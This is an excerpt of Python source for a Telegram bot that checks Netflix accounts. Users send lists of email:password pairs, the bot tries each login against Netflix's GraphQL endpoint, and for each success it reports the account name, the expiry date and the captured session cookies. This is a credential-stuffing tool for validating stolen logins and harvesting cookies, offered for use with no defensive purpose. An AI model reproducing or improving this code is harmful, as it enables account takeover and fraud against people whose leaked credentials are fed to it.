...
# Telegram Bot Token (Set in Railway Environment Variables)
...
class NetflixChecker:
    def __init__(self):
        self.ua = UserAgent()
        self.country_codes = {
            "US": "1", "PH": "63", "IN": "91", "GB": "44", "CA": "1", "AU": "61",
            "DE": "49", "FR": "33", "JP": "81", "KR": "82", "BR": "55"
        }
    ...
    async def check_account(self, email: str, password: str) -> str:
        try:
            ...
            res_auth = session.post("https://web.prod.cloud.netflix.com/graphql",
                                    json=payload, headers=headers, timeout=20)

            if "Navigating to /browse" in res_auth.text or 'universal":"/browse"' in res_auth.text:
                # Get account info
                acc_res = session.get("https://www.netflix.com/account",
                                      headers={"User-Agent": ua}, timeout=15)
                m = acc_res.text

                end = re.search(r'"localDate":"(.*?)"', m)
                expire = end.group(1) if end else "N/A"
                ...
                cookie_str = "; ".join([f"{k}={v}" for k, v in acc_res.cookies.items() if v])

                result = f"""✅ <b>SUCCESS LOGIN</b>
...
👤 Name: {name}
📅 Expire: {expire}
🍪 Cookie: <code>{cookie_str[:120]}...</code>"""
...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not lines:
        await update.message.reply_text("❌ Please send valid email:password")
        return

    checker = NetflixChecker()
    await update.message.reply_text(f"🔄 Checking {len(lines)} account(s)...", parse_mode='HTML')
